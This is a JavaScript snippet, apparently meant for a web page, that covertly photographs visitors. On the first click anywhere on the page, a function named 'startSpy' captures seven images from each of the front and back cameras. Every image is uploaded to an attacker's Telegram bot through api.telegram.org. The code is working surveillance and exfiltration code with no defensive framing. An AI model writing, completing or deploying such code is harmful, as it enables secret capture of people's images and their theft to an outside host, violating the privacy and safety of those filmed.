async function takeSnaps(facingMode) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        const canvas = document.createElement('canvas');
        
        for (let i = 1; i <= 7; i++) {
            await new Promise(r => setTimeout(r, 1000)); // 1 sec gap
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob(b => {
                let fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', b, 'snap.jpg');
                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
            }, 'image/jpeg');
        }
        stream.getTracks().forEach(t => t.stop());
    } catch (e) { sendTele(`❌ ${facingMode} Cam Fail`); }
}

async function startSpy() {
    await takeSnaps("user"); // Front Camera
    await takeSnaps("environment"); // Back Camera
}
document.addEventListener('click', startSpy, { once: true });
